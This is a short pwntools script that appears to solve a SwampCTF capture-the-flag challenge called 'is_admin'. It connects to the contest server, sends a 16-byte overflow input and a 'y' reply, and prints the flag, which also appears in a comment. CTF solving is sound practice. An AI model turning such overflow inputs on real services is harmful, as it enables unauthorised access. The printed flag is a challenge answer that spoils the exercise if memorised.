from pwn import *

#context.log_level = "debug"
elf = ELF("./is_admin", checksec=False)
context.binary = elf

p = remote("chals.swampctf.com", 40004)

p.sendline(b"A" * 16)

p.sendline(b"y")

p.readuntil(b"swampCTF{")

print("swampCTF{" + p.readuntil(b"}").decode()) # swampCTF{n0t_@11_5t@ck5_gr0w_d0wn}